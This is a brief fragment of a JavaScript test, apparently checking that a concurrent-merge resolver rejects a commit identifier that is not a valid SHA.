  await assert.rejects(resolveConcurrentMerge(api, 88, 'non-sha'), /bounded exact-head identity/);
});
